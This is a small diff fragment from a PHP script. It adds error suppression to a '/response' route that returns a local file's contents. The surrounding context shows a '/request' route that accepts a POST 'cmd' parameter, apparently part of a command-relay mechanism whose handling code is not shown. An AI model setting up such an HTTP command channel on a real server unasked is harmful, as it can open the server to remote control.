@@ -8,7 +8,7 @@ if ($_SERVER['REQUEST_URI'] === '/request' && isset($_POST['cmd'])) {
 }
 
 if ($_SERVER['REQUEST_URI'] === '/response') {
-    echo file_get_contents(__DIR__ . '/response');
+    echo @file_get_contents(__DIR__ . '/response');
     exit;
 }
 
